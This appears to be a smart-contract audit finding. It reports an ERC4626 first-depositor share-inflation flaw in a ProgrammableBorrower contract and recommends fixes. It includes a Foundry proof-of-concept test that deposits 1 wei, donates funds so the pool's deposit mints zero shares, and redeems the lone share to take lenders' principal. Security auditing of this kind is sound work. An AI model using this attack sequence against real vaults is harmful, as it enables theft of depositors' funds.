### Title
Unprotected first deposit into the programmable borrower’s ERC4626 vault lets an attacker steal pooled funds - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower.onStartEpoch()` parks all idle pool assets in an ERC4626 vault through `_depositToVault()`, but neither call specifies a minimum share output nor validates that nonzero shares were minted. [1](#0-0) [2](#0-1) 

An unprivileged user of that ERC4626 vault can execute the standard first-depositor/share-inflation sequence before the first epoch starts: deposit one wei to receive one vault share, then donate enough underlying to make the borrower’s subsequent deposit round down to zero shares. [1](#0-0) 

### Finding Description
The only vault compatibility checks performed during initialization are that the vault address and underlying asset are nonzero/matching. [3](#0-2) 

When an epoch starts, the programmable borrower snapshots its current vault assets, snapshots total on-hand plus vault assets as `epochStartVaultAssets`, and deposits the complete on-hand underlying balance into the configured vault. [1](#0-0) 

`_depositToVault()` accepts the `vault.deposit()` result unconditionally and does not check `shares != 0` or enforce a caller-selected `minShares`. [2](#0-1) 

With a vulnerable ERC4626 implementation whose conversion is `assets * totalSupply / totalAssets`, an attacker can hold the only share and inflate `totalAssets` with a direct transfer so the pool’s deposit mints zero shares. [2](#0-1) 

The accounting baseline still records the deposited amount as principal because `epochStartVaultAssets` is computed from the underlying balance before the vault deposit, not from the resulting vault-share valuation. [4](#0-3) 

Later accounting derives the borrower’s vault position by calling `convertToAssets()` on its share balance, so zero shares permanently reports zero vault assets even though the vault holds the pool’s principal. [5](#0-4) [6](#0-5) 

### Impact Explanation
If the pool deposits `A` underlying after the attacker deposits `1` wei and donates `D >= A`, the vault mints `A / (D + 1) = 0` shares to `ProgrammableBorrower`; the attacker remains the sole shareholder and redeems one share for `A + D`, netting `A`. [7](#0-6) [2](#0-1) 

This is direct theft of LP principal rather than a benign integration failure: the stolen assets were supplied by tranche depositors and transferred into the programmable borrower during `startEpoch()`. [8](#0-7) 

The broken invariant is solvency and fair vault minting: deposited pool principal no longer corresponds to recoverable vault shares, while the epoch baseline treats that principal as parked principal. [4](#0-3) [5](#0-4) 

At the next stop, `_vaultNetInterest()` reports a loss because current vault assets are zero while the principal baseline remains the deposited amount; in minted-interest mode, `stopEpoch()` therefore pulls only pending withdrawals and mints little or no net interest. [9](#0-8) [10](#0-9) 

### Likelihood Explanation
The attack requires the configured ERC4626 vault to permit arbitrary deposits and to lack inflation protection such as virtual shares/assets, a minimum initial supply, dead shares, or an already-established nontrivial share supply. [3](#0-2) [2](#0-1) 

The attacker does not need a privileged role in the credit vault and can act before the first epoch while `ProgrammableBorrower` holds no vault shares; the attacker’s capital cost is the donated amount, which is recovered together with the stolen deposit. [1](#0-0) 

Existing controls do not prevent this sequence because vault selection is privileged, but the vulnerable action is an ordinary unprivileged deposit/donation into the configured external vault, and `ProgrammableBorrower` never verifies deposit slippage or minted-share output. [11](#0-10) [2](#0-1) 

### Recommendation
Use ERC4626 vaults with inflation-resistant share accounting, such as OpenZeppelin’s virtual-assets/virtual-shares defense or a protocol-owned minimum share supply. [2](#0-1) 

Additionally, change `_depositToVault()` to compute expected shares with `previewDeposit()` and require `shares >= minShares`, with `minShares` derived from an accepted slippage bound. [2](#0-1) 

At minimum, revert when a nonzero deposit returns zero shares and, after depositing, verify that the post-deposit share valuation is within an explicitly bounded rounding loss of the epoch baseline. [4](#0-3) [6](#0-5) 

For already-deployed pools, disable or migrate away from vaults whose `previewDeposit()` can round the pool’s deposit to zero or whose share supply is controlled by a dust-sized first depositor. [11](#0-10)

  address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
  uint256 constant FORK_BLOCK = 19_225_935;

  address owner = makeAddr("owner");
  address manager = makeAddr("manager");
  address realBorrower = makeAddr("realBorrower");
  address attacker = makeAddr("attacker");
  address lender = makeAddr("lender");

  IERC20Detailed usdc = IERC20Detailed(USDC);
  RoundingERC4626 externalVault;
  IdleCreditVault strategy;
  IdleCDOEpochVariant cdo;
  ProgrammableBorrower borrowerAdapter;

  function testFirstDepositorStealsFirstEpochPrincipal() public {
    vm.createSelectFork("mainnet", FORK_BLOCK);

    externalVault = new RoundingERC4626(USDC);

    strategy = new IdleCreditVault();
    stdstore.target(address(strategy))
      .sig(strategy.token.selector)
      .checked_write(address(0));
    strategy.initialize(
      USDC,
      owner,
      manager,
      makeAddr("placeholderBorrower"),
      "borrower",
      0
    );

    cdo = new IdleCDOEpochVariant();
    stdstore.target(address(cdo))
      .sig(cdo.token.selector)
      .checked_write(address(0));
    cdo.initialize(
      0,
      USDC,
      address(this),
      owner,
      makeAddr("rebalancer"),
      address(strategy),
      100_000
    );

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    borrowerAdapter = ProgrammableBorrower(address(new TransparentUpgradeableProxy(
      address(implementation),
      makeAddr("proxyAdmin"),
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        address(externalVault),
        address(cdo),
        owner,
        manager,
        realBorrower,
        365e18
      )
    )));

    vm.startPrank(owner);
    strategy.setWhitelistedCDO(address(cdo));
    strategy.setBorrower(address(borrowerAdapter));
    strategy.setMaxApr(0);
    cdo.setIsProgrammableBorrower(true);
    cdo.setIsInterestMinted(true);
    cdo.setEpochParams(30 days, 5 days);
    cdo.setKeyringParams(address(0), 0);
    vm.stopPrank();

    uint256 lenderAssets = 100_000e6;
    uint256 donation = lenderAssets;

    // Attacker is the first ERC4626 depositor: 1 wei -> 1 share.
    deal(USDC, attacker, 1 + donation);
    vm.startPrank(attacker);
    usdc.approve(address(externalVault), type(uint256).max);
    externalVault.deposit(1, attacker);
    usdc.transfer(address(externalVault), donation);
    vm.stopPrank();

    // KYC is disabled in this deployment, so this is an ordinary lender deposit.
    deal(USDC, lender, lenderAssets);
    vm.startPrank(lender);
    usdc.approve(address(cdo), type(uint256).max);
    IdleCDO(address(cdo)).depositAA(lenderAssets);
    vm.stopPrank();

    // Honest manager starts the epoch; this deposits all lender assets into the vault.
    vm.prank(manager);
    cdo.startEpoch();

    // Because assetsBefore = donation + 1 and supply = 1, the pool receives zero shares.
    assertEq(externalVault.balanceOf(address(borrowerAdapter)), 0);
    assertEq(externalVault.totalSupply(), 1);
    assertEq(usdc.balanceOf(address(externalVault)), lenderAssets + donation + 1);

    // The sole attacker share redeems the donation plus the pool's principal.
    vm.prank(attacker);
    uint256 redeemed = externalVault.redeem(1, attacker, attacker);

    assertEq(redeemed, lenderAssets + donation + 1);
    assertEq(usdc.balanceOf(attacker), lenderAssets + donation + 1);

    // Production accounting now sees no recoverable vault position despite the baseline.
    assertEq(borrowerAdapter.vaultSharesBalance(), 0);
    assertEq(borrowerAdapter.totalUnderlying(), 0);
    assertEq(borrowerAdapter.epochStartVaultAssets(), lenderAssets);
  }
}

  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;

  /// @notice Total net epoch interest due to the pool at stop.
  /// @dev This is the single value read by IdleCDO to price the epoch: borrower contractual
  /// interest plus paid buffer interest plus positive vault PnL minus vault losses. It is a
  /// pool-facing value, so it can be lower than `borrowerInterestDebt` when the borrower still
  /// owes full contractual interest but the vault sleeve suffered a loss.
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
